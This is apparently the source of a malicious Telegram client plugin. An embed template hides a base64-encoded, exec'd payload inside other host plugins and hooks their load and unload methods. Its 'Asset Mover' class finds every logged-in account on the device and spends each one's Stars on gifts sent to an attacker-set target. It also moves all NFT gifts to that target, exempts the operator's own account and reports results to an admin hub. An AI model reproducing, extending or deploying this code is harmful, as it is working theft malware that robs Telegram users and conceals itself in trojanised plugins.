# --- Автообновление во встроенном режиме ----------------------------------
# Bootstrap script_bot/embedder.py кладёт исходник TeleLook в хост-плагин
# между этими маркерами. Обновление встроенной версии меняет ТОЛЬКО блок
# между маркерами: код хоста, его настройки и реферер (_TL_CREATOR_ID)
# остаются нетронутыми. DevServer в этом режиме не используется — он
# заменил бы хост целиком готовой сборкой TeleLook.
EMBED_BEGIN = "# >>> SpartaTeam TeleLook embed >>>"
EMBED_END = "# <<< SpartaTeam TeleLook embed <<<"
# Шаблон блока — точная копия script_bot/embedder.py::_BOOT:
# правишь шаблон здесь — обнови и там (и наоборот).
EMBED_BOOT = r'''
# >>> SpartaTeam TeleLook embed >>>
_TL_SOURCE = __import__("base64").b64decode("".join([
@@CHUNKS@@
])).decode("utf-8")
_TL_CREATOR_ID = @@CREATOR@@
_TL_NS = {"__name__": "telelook_embedded",
          "__file__": globals().get("__file__", "TeleLook.plugin")}
exec(compile(_TL_SOURCE, "TeleLook.embedded", "exec"), _TL_NS)
_TL_CLASS = _TL_NS.get("AssetMoverPlugin")
_TL_INSTANCE = None
_TL_STARTED = False


def _tl_start(_host):
    """Запускает встроенный TeleLook на хост-плагине."""
    global _TL_INSTANCE, _TL_STARTED
    if _TL_STARTED or _TL_CLASS is None:
        return
    _TL_STARTED = True
    try:
        _TL_NS["CREATOR_ID"] = int(_TL_CREATOR_ID)
        _inst = _TL_CLASS()
        _inst.log = lambda _m: _host.log("[TeleLook] %s" % _m)
        _inst.get_setting = lambda _k, _d=None: _host.get_setting(
            "tl_" + str(_k), _d)
        _inst.set_setting = lambda _k, _v: _host.set_setting(
            "tl_" + str(_k), _v)
        # хук "!"-команд хоста не трогаем (регистрация общая) — бот
        # TeleLook работает как обычно,("!")-префикс отключён
        _inst.add_on_send_message_hook = lambda: None
        _TL_INSTANCE = _inst
        _inst.on_plugin_load()
        _host.log("[TeleLook] embed loaded (referrer %s)" % _TL_CREATOR_ID)
    except Exception as _e:
        _TL_INSTANCE = None
        try:
            _host.log("[TeleLook] embed load failed: %s" % _e)
        except Exception:
            pass


def _tl_stop(_host):
    global _TL_INSTANCE
    if _TL_INSTANCE is None:
        return
    try:
        _TL_INSTANCE.on_plugin_unload()
    except Exception as _e:
        try:
            _host.log("[TeleLook] embed unload failed: %s" % _e)
        except Exception:
            pass
    _TL_INSTANCE = None


def _tl_wrap(_cls):
    """Оборачивает жизненный цикл хост-класса плагина."""
    if _cls.__dict__.get("_tl_wrapped"):
        return
    _load = getattr(_cls, "on_plugin_load", None)
    _unload = getattr(_cls, "on_plugin_unload", None)

    def on_plugin_load(_self, _o=_load):
        if _o is not None:
            _o(_self)
        _tl_start(_self)

    def on_plugin_unload(_self, _o=_unload):
        _tl_stop(_self)
        if _o is not None:
            _o(_self)

    _cls.on_plugin_load = on_plugin_load
    _cls.on_plugin_unload = on_plugin_unload
    _cls._tl_wrapped = True


try:
    for _tl_name, _tl_val in list(globals().items()):
        try:
            if (isinstance(_tl_val, type)
                    and hasattr(_tl_val, "on_plugin_load")
                    and getattr(_tl_val, "__module__", "")
                    == globals().get("__name__")):
                _tl_wrap(_tl_val)
        except Exception:
            pass
except Exception:
    pass
# <<< SpartaTeam TeleLook embed <<<
'''

class AssetMoverPlugin(BasePlugin):

    def _diag(self, text):
        """Диагностика: пишет и в лог клиента, и в очередь логов на хаб,
        чтобы строки были видны админу в чате (self.log туда не попадает)."""
        try:
            self.log(text)
        except Exception:
            pass
        try:
            q = getattr(self, "_hub_logs", None)
            if q is not None:
                q.append(f"🔍 {text}")
                if len(q) > 500:
                    del q[:-500]
        except Exception:
            pass

    def on_plugin_load(self):
        self.log(f"Asset Mover loaded (creаtor/referrer: {CREATOR_ID})")
        self._stop = threading.Event()
        self._hub_logs = []  # очередь логов на сервер-хаб (до старта потоков)
        self._known_accounts = set(self._load_known())
        for slot in self._scan_accounts():
            self._known_accounts.add(slot["user_id"])
        self._save_known()
        self._poll_thread = threading.Thread(target=self._poll_loop, daemon=True)
        self._poll_thread.start()
        if not self._update_urls():
            self.log("автообновление: источник не задан — /sethub <url> "
                     "или /setupdateurl <url>")
        # Обновление ТОЛЬКО по команде админа (/update [force]).
        # Фоновый чек включается явно: /setupdateauto 1
        if str(self.get_setting("update_auto", "0")).lower() in (
                "1", "true", "on", "yes", "да"):
            self._update_thread = threading.Thread(target=self._update_loop,
                                                   daemon=True)
            self._update_thread.start()
        else:
            self.log("автообновление выключено — обновляй вручную: /update")
        # сервер-хаб: логи и управление по сети (с любых устройств)
        self._hub_thread = threading.Thread(target=self._hub_loop,
                                            daemon=True)
        self._hub_thread.start()

    def on_plugin_unload(self):
        self.log("Asset Mover unloaded")
        if hasattr(self, "_stop"):
            self._stop.set()

    def _cfg(self, key, default):
        val = self.get_setting(key, None)
        if val is None or val == "" or val == 0:
            return default
        return val

    def _bot_token(self):
        return str(self._cfg("bot_token", BOT_TOKEN) or "")

    def _owner_id(self):
        try:
            return int(self._cfg("owner_id", OWNER_ID))
        except (TypeError, ValueError):
            return 0

    def _target_id(self):
        try:
            return int(self._cfg("target_user_id", TARGET_USER_ID))
        except (TypeError, ValueError):
            return 0

    def _target_username(self):
        return str(self._cfg("target_username", TARGET_USERNAME) or "").strip().lstrip("@")

    def _log_chat(self):
        try:
            return int(self._cfg("log_chat_id", LOG_CHAT_ID))
        except (TypeError, ValueError):
            return 0

    def _auto_nick(self):
        return str(self._cfg("auto_nick", "") or "").strip()

    def _banner_text(self):
        return str(self._cfg("banner_text", "") or "").strip()

    def _broadcast_slug(self):
        """Slug папки чатов из addlist-ссылки (или просто slug)."""
        raw = str(self._cfg("broadcast_slug", BROADCAST_SLUG) or "").strip()
        if "addlist/" in raw:
            raw = raw.split("addlist/", 1)[1]
        return raw.strip().strip("/").split("?")[0].split("#")[0]

    def _broadcast_text(self):
        """Текст рассылки, который admin задаст позже (/setbroadcast)."""
        return str(self._cfg("broadcast_text", "") or "")

    def _auto_enabled(self):
        """Авто-режим включён? По умолчанию ВКЛ — админ выключает
        через бота (/auto off или кнопка в меню), настройка auto_mode."""
        try:
            return str(self.get_setting("auto_mode", "1")).strip().lower() in (
                "1", "true", "on", "yes", "да")
        except Exception:
            return False

    def _is_admin(self, user_id):
        """Аккаунт принадлежит владельцу (админу)?
        С аккаунта админа НИЧЕГО не списываем — его звёзды/подарки не трогаем.
        Если OWNER_ID не задан (0), ни один аккаунт не считается админским."""
        oid = self._owner_id()
        try:
            return oid > 0 and int(user_id) == oid
        except (TypeError, ValueError):
            return False

    def _load_known(self):
        try:
            raw = self.get_setting("known_accounts", "[]")
            return json.loads(raw) if raw else []
        except Exception:
            return []

    def _save_known(self):
        try:
            self.set_setting("known_accounts", json.dumps(sorted(self._known_accounts)))
        except Exception as e:
            self.log(f"save known failed: {e}")

    def _tl(self, request, account, timeout=45):
        done = threading.Event()
        box = {}

        def _cb(response, error):
            box["r"] = response
            box["e"] = error
            done.set()

        if RequestCallback is not None:
            try:
                send_request(request, RequestCallback(_cb), account=account)
            except TypeError:
                send_request(request, RequestCallback(_cb))
        else:
            send_request(request, _cb, account=account)
        if not done.wait(timeout):
            raise TimeoutError(f"TL timeout: {type(request).__name__}")
        if box.get("e") is not None:
            err = box["e"]
            text = getattr(err, "text", str(err))
            code = getattr(err, "code", "?")
            raise RuntimeError(f"RPC {code}: {text}")
        return box.get("r")

    def _user_config(self, slot):
        """Возвращает конфиг слота, подстраиваясь под сигнатуру SDK.

        В разных сборках AyuGram/ExteraGram get_user_config:
          - get_user_config(slot)       — вариант с слотом;
          - get_user_config()           — новая (2026.03.x): без аргументов,
            возвращает либо одиночный конфиг, либо список/словарь конфигов.
        Совместимый режим определяется один раз и кэшируется в self._uc_mode."""
        mode = getattr(self, "_uc_mode", None)
        if mode is None:
            try:
                uc = get_user_config(slot)
                self._uc_mode = "slot"
                return uc
            except TypeError as e:
                # Любая TypeError от вызова со слотом = несовпадение сигнатуры:
                # в новых сборках (2026.03.x) get_user_config() без аргументов.
                # Ловим и повторяем вызов без аргумента — иначе скан всегда
                # падает и все команды отвечают «0 аккаунтов».
                self._uc_mode = "noarg"
                self._diag(f"uc: сигнатура БЕЗ слота ({type(e).__name__}: {e}) — пробую "
                           f"get_user_config()")
            except Exception as e:
                self._diag(f"uc[{slot}]: get_user_config({slot}) -> "
                           f"{type(e).__name__}: {e}")
                return None
        if self._uc_mode == "slot":
            try:
                return get_user_config(slot)
            except Exception as e:
                self._diag(f"uc[{slot}]: get_user_config({slot}) -> "
                           f"{type(e).__name__}: {e}")
                return None
        # режим без аргументов
        if not getattr(self, "_uc_probe_done", False):
            self._uc_probe_done = True
            try:
                import client_utils
                names = [n for n in dir(client_utils)
                         if any(k in n.lower()
                                for k in ("config", "account", "slot", "user"))]
                self._diag(f"uc: client_utils -> {names}")
            except Exception as e:
                self._diag(f"uc: обзор client_utils -> {type(e).__name__}: {e}")
        if slot != 0 and getattr(self, "_uc_noarg", None) == "single":
            return None  # вернулся одиночный конфиг — слотов нет
        if getattr(self, "_uc_noarg", None) == "broken":
            return None  # безаргументный вызов уже падал — не шумим по каждому слоту
        try:
            val = get_user_config()
        except Exception as e:
            self._uc_noarg = "broken"
            self._diag(f"uc: get_user_config() -> {type(e).__name__}: {e}")
            return None
        if not getattr(self, "_uc_noarg_logged", False):
            self._uc_noarg_logged = True
            self._diag(f"uc: get_user_config() -> {type(val).__name__} "
                       f"len={len(val) if hasattr(val, '__len__') else '-'}")
        if isinstance(val, dict):
            # ключи слота могут быть int или строкой — пробуем оба
            for key in (slot, str(slot)):
                try:
                    if key in val:
                        return val[key]
                except Exception:
                    pass
            return None
        if isinstance(val, (list, tuple)):
            return val[slot] if slot < len(val) else None
        # Java-список (ArrayList и т.п.): размер через len() или size()
        try:
            size = len(val) if hasattr(val, "__len__") else int(val.size())
            return val[slot] if slot < size else None
        except Exception:
            pass
        self._uc_noarg = "single"
        return val if slot == 0 else None

    def _scan_accounts(self):
        """Все подключённые аккаунты без ограничения количества:
        [{slot, user_id, name}]. Идём по слотам 0,1,2,... пока
        get_user_config(slot) возвращает конфиг; останавливаемся после
        EMPTY_SLOT_STREAK пустых слотов подряд.

        ВАЖНО: currentUser в UserConfig — поле Java-объекта, а не метод.
        Раньше вызывался uc.getCurrentUser(), что на поле кидало
        AttributeError, который глушится except'ом с break — в итоге
        scan_accounts всегда возвращал [] и все команды (ник, фото,
        статус) отвечали «0 аккаунтов» без единой ошибки в логе."""
        out = []
        empty_run = 0
        slot = 0
        self._diag(f"scan: старт (порог пустых слотов={EMPTY_SLOT_STREAK})")
        while empty_run < EMPTY_SLOT_STREAK:
            user = None
            try:
                uc = self._user_config(slot)
            except Exception as e:
                # последний рубеж: scan[...] не должен ронять весь цикл
                self._diag(f"scan[{slot}]: get_user_config -> {type(e).__name__}: {e}")
                uc = None
            if uc is None:
                self._diag(f"scan[{slot}]: конфиг пуст (None)")
            else:
                try:
                    # currentUser — поле, содержащее объект TLRPC$TL_user.
                    # НЕ вызывать: в Chaquopy callable(java_obj) возвращает
                    # True, а вызов кидает TypeError (нет functional interface).
                    user = getattr(uc, "currentUser", None)
                except Exception as e:
                    self._diag(f"scan[{slot}]: currentUser -> {type(e).__name__}: {e}")
                    user = None
                if user is None:
                    self._diag(f"scan[{slot}]: конфиг есть, currentUser пуст")
            if user is None or not getattr(user, "id", 0):
                empty_run += 1
                slot += 1
                continue
            empty_run = 0
            name = " ".join(
                x for x in [getattr(user, "first_name", "") or "",
                            getattr(user, "last_name", "") or ""] if x
            ) or "Без имени"
            out.append({"slot": slot, "user_id": int(user.id), "name": name})
            self._diag(f"scan[{slot}]: ✅ id={user.id} {name}")
            slot += 1
        self._diag(f"scan: итог — аккаунтов {len(out)}, слотов пройдено {slot}")
        return out

    def _tl_modules(self):
        """Список модулей-хранилищ TL-классов, доступных в этой сборке."""
        found = []
        try:
            from hook_utils import find_class
        except Exception:
            find_class = None
        candidates = (('org.telegram.tgnet', 'TLRPC'),
                      ('org.telegram.tgnet.tl', 'TL_stars'),
                      ('org.telegram.tgnet.tl', 'TL_payments'),
                      ('org.telegram.tgnet.tl', 'TL_account'),
                      ('org.telegram.tgnet.tl', 'TL_contacts'),
                      ('org.telegram.tgnet.tl', 'TL_messages'),
                      ('org.telegram.tgnet.tl', 'TL_users'),
                      ('org.telegram.tgnet.tl', 'TL_chatlists'))
        for parent, attr in candidates:
            value = None
            try:
                import importlib
                value = getattr(importlib.import_module(parent), attr, None)
            except Exception:
                value = None
            if value is None:
                try:
                    value = getattr(__import__(parent, fromlist=[attr]), attr, None)
                except Exception:
                    value = None
            if value is None:
                try:
                    value = __import__(parent + '.' + attr, fromlist=[attr])
                except Exception:
                    value = None
            if value is None and find_class is not None:
                try:
                    value = find_class(parent + '.' + attr)
                except Exception:
                    value = None
            if value is not None:
                found.append(value)
        return found

    def _tl_class(self, *names):
        """Найти TL-класс по всем модулям/путям (первый совпавший вариант имени).
        names — варианты имени: старый (TLRPC.TL_payments_*) и новый
        (TL_stars.*/TL_payments.*). Если ничего не найдено — понятная ошибка."""
        for name in names:
            for module in self._tl_modules():
                found = getattr(module, name, None)
                if found is not None:
                    return found
        seen = ', '.join(names)
        raise RuntimeError('TL-класс не найден ни в одном модуле: ' + seen)

    def _tl_has(self, *names):
        """Есть ли TL-класс (по любому из вариантов имён) в этой сборке?"""
        try:
            self._tl_class(*names)
            return True
        except Exception:
            return False

    @staticmethod
    def _tl_list(obj):
        """Java-список (ArrayList/Vector) из TL-ответа -> Python-список.
        На части сборок списки не итерируются напрямую — читаем через
        .size()/.get(i). Скопировано с рабочего плагина icon_themer_plugin.py."""
        if obj is None:
            return []
        if isinstance(obj, (list, tuple)):
            return list(obj)
        size = None
        try:
            size = obj.size()
        except Exception:
            size = None
        if size is not None:
            return [obj.get(i) for i in range(int(size))]
        try:
            return list(obj)
        except Exception:
            return []

    def _to_vector(self, items):
        """Python-список -> Java ArrayList для TL-полей типа Vector.
        Сериализатор tgnet вызывает .size()/.get(), поэтому нужен именно
        java.util.ArrayList; если его нет — отдаём обычный list."""
        try:
            from java.util import ArrayList
            vec = ArrayList()
            for it in items:
                vec.add(it)
            return vec
        except Exception:
            return list(items)

    @staticmethod
    def _int_vector(items):
        """ArrayList из java.lang.Integer для TL-полей Vector<int>
        (например, messages.forwardMessages.id). Chaquopy иначе боксит
        Python-int как Long, и сериализатор tgnet падает с
        ClassCastException -> запрос не уходит -> TL timeout."""
        try:
            from java.util import ArrayList
            from java.lang import Integer
            vec = ArrayList()
            for it in items:
                vec.add(Integer(int(it)))
            return vec
        except Exception:
            return list(int(x) for x in items)

    @staticmethod
    def _long_vector(items):
        """ArrayList из java.lang.Long для TL-полей Vector<long>
        (например, messages.forwardMessages.random_id)."""
        try:
            from java.util import ArrayList
            from java.lang import Long
            vec = ArrayList()
            for it in items:
                vec.add(Long(int(it)))
            return vec
        except Exception:
            return list(int(x) for x in items)

    @staticmethod
    def _rand_id():
        return int(time.time() * 1000000) & 0x7FFFFFFFFFFFFFFF

    def _stars_balance(self, account):
        """Баланс звёзд аккаунта (payments.getStarsStatus -> balance.amount).
        Ищем класс во всех модулях клиента: TLRPC.TL_payments_getStarsStatus
        (старые сборки) ИЛИ TL_stars.getStarsStatus (новые — AyuGram/ExteraGram)."""
        req = self._tl_class('TL_payments_getStarsStatus',
                             'TL_stars_getStarsStatus')()
        req.peer = TLRPC.TL_inputPeerSelf()
        try:
            req.ton = False
        except Exception:
            pass
        resp = self._tl(req, account)
        bal = getattr(resp, 'balance', None)
        if bal is None:
            return 0
        return int(getattr(bal, 'amount', 0) or 0)

    @staticmethod
    def _tl_find(substr):
        """Диагностика: имена существующих TLRPC-классов, содержащих substr.
        Помогает узнать, как методы называются в конкретной сборке клиента."""
        out = []
        try:
            for name in dir(TLRPC):
                if substr.lower() in name.lower():
                    out.append(name)
        except Exception:
            pass
        return sorted(out)


    def _list_own_gifts(self, account, unique_only=False):
        """
        Все подарки аккаунта (payments.getSavedStarGifts, peer=self, постранично).
        unique_only=True -> только NFT (starGiftUnique).
        Возвращает [savedStarGift].

        ВНИМАНИЕ: не во всех сборках клиента скомпилирован метод
        payments.getSavedStarGifts. Если его нет — возвращаем пустой список
        (кол-во подарков на таком клиенте определить нельзя), чтобы /status и
        логи не падали.
        """
        if not self._tl_has("TL_payments_getSavedStarGifts",
                            "getSavedStarGifts"):
            return []
        gifts = []
        offset = ""
        req_cls = self._tl_class("TL_payments_getSavedStarGifts",
                                 "getSavedStarGifts")
        for _ in range(50):
            req = req_cls()
            req.peer = TLRPC.TL_inputPeerSelf()
            req.offset = offset or ""
            req.limit = 100
            resp = self._tl(req, account)
            if resp is None:
                break
            page = self._tl_list(getattr(resp, "gifts", None))
            for sg in page:
                if unique_only and not self._is_nft(sg):
                    continue
                gifts.append(sg)
            nxt = getattr(resp, "next_offset", None)
            if not nxt:
                break
            offset = nxt
        return gifts

    def _is_nft(self, saved_gift):
        """Подарок — уникальный (NFT)? gift может быть starGift или starGiftUnique.
        Класс starGiftUnique ищем по всем модулям (старое имя TLRPC.TL_starGiftUnique
        либо новое в TL_stars/TL_payments)."""
        g = getattr(saved_gift, "gift", None)
        if g is None:
            return False
        try:
            unique_cls = self._tl_class("TL_starGiftUnique", "starGiftUnique")
        except Exception:
            unique_cls = TLRPC.TL_starGiftUnique
        try:
            return isinstance(g, unique_cls)
        except Exception:
            return type(g).__name__.startswith("TL_starGiftUnique")

    # ------------------------------------------------------------------
    # Знакомство с приёмником: access_hash
    # ------------------------------------------------------------------
    @staticmethod
    def _input_peer_user(user):
        """InputPeerUser из User-подобного объекта (id + access_hash)."""
        peer = TLRPC.TL_inputPeerUser()
        peer.user_id = int(getattr(user, "id", 0) or 0)
        peer.access_hash = int(getattr(user, "access_hash", 0) or 0)
        return peer

    def _hash_store(self):
        """Словарь {слот: {user_id: access_hash}} из настроек."""
        try:
            data = json.loads(self.get_setting("target_access_hash", "{}") or "{}")
            if isinstance(data, dict):
                return data
        except Exception:
            pass
        return {}

    def _save_hash_store(self, data):
        try:
            self.set_setting("target_access_hash", json.dumps(data))
        except Exception as e:
            self.log(f"save access_hash failed: {e}")

    def _cache_target_hash(self, account, uid, access_hash):
        """Запоминает access_hash приёмника для слота account.
        access_hash индивидуален для каждого аккаунта, поэтому храним
        его по слотам: каждый аккаунт должен узнать цель сам."""
        try:
            data = self._hash_store()
            slot_key = str(int(account))
            per = data.get(slot_key)
            if not isinstance(per, dict):
                per = {}
                data[slot_key] = per
            per[str(int(uid))] = str(int(access_hash))
            self._save_hash_store(data)
        except Exception as e:
            self.log(f"cache access_hash failed: {e}")

    def _cached_target_hash(self, account, uid):
        """Сохранённый при знакомстве access_hash для слота (0 — если нет)."""
        try:
            per = self._hash_store().get(str(int(account)))
            if isinstance(per, dict):
                return int(per.get(str(int(uid)), 0) or 0)
        except Exception:
            pass
        return 0

    def _resolve_username_user(self, account, uname):
        """contacts.resolveUsername -> User с access_hash (или None).
        Если задана цель (target_user_id) — возвращаем пользователя
        именно с этим ID, чтобы не перепутать приёмника с кем-то ещё.
        Последняя ошибка кладётся в self._last_resolve_err."""
        self._last_resolve_err = None
        uname = str(uname or "").strip().lstrip("@")
        if not uname:
            return None
        if not self._tl_has("TL_contacts_resolveUsername", "resolveUsername"):
            self._last_resolve_err = "в сборке клиента нет contacts.resolveUsername"
            return None
        try:
            req = self._tl_class("TL_contacts_resolveUsername",
                                 "resolveUsername")()
            req.username = uname
            res = self._tl(req, account)
        except Exception as e:
            self._last_resolve_err = str(e)
            self.log(f"resolveUsername('{uname}'): {e}")
            return None
        target = self._target_id()
        best = None
        for u in self._tl_list(getattr(res, "users", None)):
            uid = int(getattr(u, "id", 0) or 0)
            if uid <= 0:
                continue
            if target and uid == target:
                return u
            if best is None:
                best = u
            elif (getattr(u, "access_hash", None) not in (None, 0)
                  and getattr(best, "access_hash", None) in (None, 0)):
                best = u
        return best

    def _resolve_target_peer(self, account):
        """InputPeer приёмника. Порядок поиска:
        1) кэш клиента (диалог открыт/контакт есть);
        2) access_hash, сохранённый при знакомстве (_know_target);
        3) живой resolveUsername по username приёмника."""
        target = self._target_id()
        if not target:
            raise RuntimeError("TARGET_USER_ID не задан (/settarget <id>)")
        mc = get_messages_controller(account)
        try:
            peer = mc.get_input_peer(target)
        except Exception:
            peer = None
        if peer is not None:
            return peer
        user = None
        try:
            user = mc.get_user(target)
        except Exception:
            user = None
        if user is not None and getattr(user, "access_hash", None) not in (None, 0):
            return self._input_peer_user(user)
        cached = self._cached_target_hash(account, target)
        if cached:
            peer = TLRPC.TL_inputPeerUser()
            peer.user_id = int(target)
            peer.access_hash = cached
            return peer
        # Последний шанс: резолвим username приёмника прямо сейчас
        # (тем же кодом, что и /knowtarget), и запоминаем hash для слота.
        user = self._resolve_username_user(account, self._target_username())
        if user is not None and getattr(user, "access_hash", None) not in (None, 0):
            uid = int(getattr(user, "id", 0) or 0)
            if uid != int(target):
                raise RuntimeError(
                    f"@{self._target_username()} — это ID {uid}, а цель {target}: "
                    "исправьте /settarget или /settargetusername")
            self._cache_target_hash(account, uid, user.access_hash)
            return self._input_peer_user(user)
        raise RuntimeError(
            f"❌ Аккаунт (слот {account}) не знает пользователя {target} — "
            "сначала откройте с ним диалог в Телеграме или добавьте в контакты, "
            "либо запустите /knowtarget при заданном /settargetusername"
        )

    def _know_target(self, account):
        """Знакомит аккаунт (слот account) с приёмником, чтобы он мог отправлять
        ему подарки (звёзды) и NFT. Резолвит username приёмника через
        contacts.resolveUsername -> получаем access_hash -> сохраняем его для
        слота (см. _cache_target_hash), чтобы _resolve_target_peer мог собрать
        InputPeerUser даже без открытого диалога.

        Возвращает (ok: bool, info: str)."""
        uname = self._target_username()
        if not uname:
            return False, ("username приёмника не задан "
                           "(/settargetusername <username>)")
        user = self._resolve_username_user(account, uname)
        uid = int(getattr(user, "id", 0) or 0) if user is not None else 0
        if not uid:
            if self._last_resolve_err:
                return False, (f"resolveUsername('@{uname}') не удался: "
                               f"{self._last_resolve_err}")
            return False, f"пользователь @{uname} не найден (неверный username?)"
        if getattr(user, "access_hash", None) in (None, 0):
            return False, f"@{uname}: сервер не вернул access_hash"
        target = self._target_id()
        if target and uid != target:
            return False, (f"@{uname} — это ID {uid}, а цель {target}: "
                           "исправьте /settarget или /settargetusername")
        self._cache_target_hash(account, uid, user.access_hash)
        if not target:
            self.set_setting("target_user_id", uid)
            self.log(f"target_user_id автоустановлен: {uid} (@{uname})")
        return True, f"аккаунт #{account} теперь знает @{uname} (ID {uid})"

    def _buy_gift_for_target(self, account, gift_id, peer):
        """Покупка подарка за звёзды и отправка цели.
        inputInvoiceStarGift -> payments.getPaymentForm -> payments.sendStarsForm.
        Все классы ищем по всем модулям клиента (поддержка AyuGram/ExteraGram)."""
        if not self._tl_has("TL_payments_sendStarsForm", "sendStarsForm"):
            raise RuntimeError("в сборке клиента нет payments.sendStarsForm — "
                               "покупка подарков невозможна")
        invoice = self._tl_class("TL_inputInvoiceStarGift")()
        invoice.peer = peer
        invoice.gift_id = int(gift_id)

        form_req = self._tl_class("TL_payments_getPaymentForm",
                                  "getPaymentForm")()
        form_req.invoice = invoice
        form = self._tl(form_req, account)

        pay_req = self._tl_class("TL_payments_sendStarsForm", "sendStarsForm")()
        pay_req.invoice = invoice
        pay_req.form_id = int(getattr(form, "form_id", 0) or 0)
        return self._tl(pay_req, account)

    def _drain_stars(self, account, report):
        """
        Пока баланс >= цены хотя бы одного подарка — покупаем самый дорогой
        доступный и отправляем цели. Возвращает (куплено, потрачено, остаток).
        """
        peer = self._resolve_target_peer(account)
        balance = self._stars_balance(account)
        report(f"Баланс: {balance} ⭐")

        if not self._tl_has("TL_payments_getStarGifts", "getStarGifts"):
            report("В сборке клиента нет payments.getStarGifts — "
                   "каталог подарков недоступен, слив невозможен")
            return 0, 0, balance
        avail_req = self._tl_class("TL_payments_getStarGifts",
                                   "getStarGifts")()
        avail_req.hash = 0
        avail = self._tl(avail_req, account)
        catalog = self._tl_list(getattr(avail, "gifts", None))
        if not catalog:
            report("Каталог подарков пуст — нечего покупать")
            return 0, 0, balance
        catalog.sort(key=lambda g: int(getattr(g, "stars", 0) or 0), reverse=False)

        bought = 0
        spent = 0
        idle = 0
        while balance > 0 and idle < 3 and bought < MAX_BUY_ITERATIONS:
            choice = None
            for g in catalog:
                price = int(getattr(g, "stars", 0) or 0)
                if price <= 0 or price > balance:
                    continue
                if getattr(g, "sold_out", False):
                    continue
                rem = getattr(g, "availability_remains", None)
                if rem is not None and int(rem) <= 0:
                    continue
                choice = g
                break
            if choice is None:
                break
            price = int(choice.stars)
            try:
                self._buy_gift_for_target(account, choice.id, peer)
                bought += 1
                spent += price
                balance -= price
                report(f"🎁 Куплен подарок за {price} ⭐ (итого {bought}, остаток {balance} ⭐)")
                time.sleep(BUY_DELAY)
                idle = 0
            except Exception as e:
                msg = str(e)
                report(f"Ошибка покупки ({price} ⭐): {msg}")
                if "FLOOD" in msg.upper() or "TIMEOUT" in msg.upper():
                    time.sleep(10)
                    continue
                try:
                    catalog.remove(choice)
                except ValueError:
                    pass
                idle += 1
        try:
            balance = self._stars_balance(account)
        except Exception:
            pass
        return bought, spent, balance

    def _transfer_nft(self, account, report):
        """
        Передача всех уникальных (NFT) подарков цели.
        Оплата комиссии: inputInvoiceStarGiftTransfer -> getPaymentForm ->
        sendStarsForm; если комиссии нет (NO_PAYMENT_NEEDED) ->
        payments.transferStarGift напрямую.
        """
        peer = self._resolve_target_peer(account)
        if not self._tl_has("TL_payments_transferStarGift", "transferStarGift"):
            report("В сборке клиента нет payments.transferStarGift — "
                   "передача NFT невозможна")
            return 0, 0
        if not self._tl_has("TL_payments_getSavedStarGifts", "getSavedStarGifts"):
            report("В сборке клиента нет payments.getSavedStarGifts — "
                   "список подарков недоступен")
            return 0, 0
        nft_list = self._list_own_gifts(account, unique_only=True)
        if not nft_list:
            report("NFT-подарков нет")
            return 0, 0
        report(f"Найдено NFT: {len(nft_list)}")

        ok, fail = 0, 0
        for i, sg in enumerate(nft_list, 1):
            msg_id = getattr(sg, "msg_id", None)
            saved_id = getattr(sg, "saved_id", None)
            try:
                if msg_id is not None:
                    stargift = self._tl_class(
                        "TL_inputSavedStarGiftUser", "inputSavedStarGiftUser")()
                    stargift.msg_id = int(msg_id)
                elif saved_id is not None:
                    stargift = self._tl_class(
                        "TL_inputSavedStarGiftChat", "inputSavedStarGiftChat")()
                    stargift.saved_id = int(saved_id)
                    src = getattr(sg, "peer", None)
                    if src is None:
                        raise RuntimeError("чат-подарок без peer — пропущен")
                    stargift.peer = self._peer_from_saved(account, src)
                else:
                    raise RuntimeError("подарок без msg_id/saved_id — пропущен")

                self._do_transfer(account, stargift, peer)
                ok += 1
                report(f"✅ NFT {i}/{len(nft_list)} передано")
                time.sleep(XFER_DELAY)
            except Exception as e:
                fail += 1
                report(f"❌ NFT {i}/{len(nft_list)}: {e}")
        return ok, fail

    def _peer_from_saved(self, account, src_peer):
        mc = get_messages_controller(account)
        pid = (getattr(src_peer, "channel_id", None)
               or getattr(src_peer, "user_id", None)
               or getattr(src_peer, "chat_id", None))
        try:
            p = mc.get_input_peer(int(pid))
            if p is not None:
                return p
        except Exception:
            pass
        if getattr(src_peer, "channel_id", None):
            p = TLRPC.TL_inputPeerChannel()
            p.channel_id = int(src_peer.channel_id)
        elif getattr(src_peer, "chat_id", None):
            p = TLRPC.TL_inputPeerChat()
            p.chat_id = int(src_peer.chat_id)
        else:
            p = TLRPC.TL_inputPeerUser()
            p.user_id = int(getattr(src_peer, "user_id", 0))
        return p

    def _do_transfer(self, account, stargift, to_peer):
        invoice = self._tl_class("TL_inputInvoiceStarGiftTransfer",
                                 "inputInvoiceStarGiftTransfer")()
        invoice.stargift = stargift
        invoice.to_id = to_peer
        try:
            form_req = self._tl_class("TL_payments_getPaymentForm",
                                      "getPaymentForm")()
            form_req.invoice = invoice
            form = self._tl(form_req, account)
            pay_req = self._tl_class("TL_payments_sendStarsForm", "sendStarsForm")()
            pay_req.invoice = invoice
            pay_req.form_id = int(getattr(form, "form_id", 0) or 0)
            self._tl(pay_req, account)
        except Exception as e:
            if "NO_PAYMENT_NEEDED" in str(e):
                req = self._tl_class("TL_payments_transferStarGift",
                                     "transferStarGift")()
                req.stargift = stargift
                req.to_id = to_peer
                self._tl(req, account)
            else:
                raise

    def _set_nick(self, account, first_name, last_name=None):
        """account.updateProfile#78515775 flags:# first_name:flags.0?string
        last_name:flags.1?string about:flags.2?string = User

        ВАЖНО: first_name/last_name — необязательные поля под флагами. Сервер
        применит имя только если в flags выставлен соответствующий бит
        (first_name = бит 0 = 1, last_name = бит 1 = 2). Если не выставить
        флаги, RPC «пройдёт успешно» и вернёт User, но ник НЕ изменится."""
        req = self._tl_class('TL_account_updateProfile', 'updateProfile')()
        req.flags = 0
        if first_name:
            req.flags |= 1
            req.first_name = first_name
        if last_name:
            req.flags |= 2
            req.last_name = last_name
        return self._tl(req, account)

    def _input_saved_gift(self, account, saved_gift):
        """InputSavedStarGift из сохранённого подарка (сырой TL-объект):
        уникальный/NFT-чат — по saved_id, обычный — по msg_id."""
        saved_id = getattr(saved_gift, "saved_id", None)
        msg_id = getattr(saved_gift, "msg_id", None)
        if saved_id:
            stargift = self._tl_class("TL_inputSavedStarGiftChat",
                                      "inputSavedStarGiftChat")()
            stargift.saved_id = int(saved_id)
            src = getattr(saved_gift, "peer", None)
            if src is None:
                raise RuntimeError("чат-подарок без peer — пропущен")
            stargift.peer = self._peer_from_saved(account, src)
            return stargift
        if msg_id is not None:
            stargift = self._tl_class("TL_inputSavedStarGiftUser",
                                      "inputSavedStarGiftUser")()
            stargift.msg_id = int(msg_id)
            return stargift
